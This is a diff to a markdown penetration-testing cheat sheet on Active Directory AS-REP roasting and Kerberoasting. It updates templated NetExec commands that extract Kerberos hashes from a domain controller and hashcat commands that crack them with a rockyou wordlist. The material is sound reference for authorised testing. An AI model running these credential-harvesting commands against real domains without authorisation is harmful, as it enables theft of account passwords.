@@ -6,22 +6,22 @@ tags: [ad, kerberos, asrep, kerberoast, hashcat]
 
 ## AS-REP roasting
 
-Requires a known username with Kerberos preauthentication disabled. Empty password requests an unauthenticated check.
+Requires known usernames with Kerberos preauthentication disabled. users.txt contains one reviewed candidate per line; the empty password requests unauthenticated checks.
 
 ```bash
-nxc ldap {{DC01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '' --asreproast asrep.txt
-hashcat -m 18200 asrep.txt wordlist.txt
+nxc ldap {{DC}} -d '{{DOMAIN}}' -u users.txt -p '' --asreproast asrep.txt
+hashcat -m 18200 asrep.txt /home/kali/tools/wordlists/rockyou.txt
 ```
 
-Prepare wordlist.txt locally. Mode 18200 applies to etype 23 output only. [Source](https://www.netexec.wiki/ldap-protocol/asreproast).
+Prepare users.txt locally. Mode 18200 applies to etype 23 output only. [Source](https://www.netexec.wiki/ldap-protocol/asreproast).
 
 ## Kerberoasting
 
 Requires domain authentication and an eligible account with an SPN.
 
 ```bash
-nxc ldap {{DC01}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --kerberoasting tgs.txt
-hashcat -m 13100 tgs.txt wordlist.txt
+nxc ldap {{DC}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' --kerberoasting tgs.txt
+hashcat -m 13100 tgs.txt /home/kali/tools/wordlists/rockyou.txt
 ```
 
 The cracking command is for etype 23 only. Ordinary roasting requests tickets; targeted roasting that adds an SPN also needs write rights and changes AD. [Source](https://www.netexec.wiki/ldap-protocol/kerberoasting).
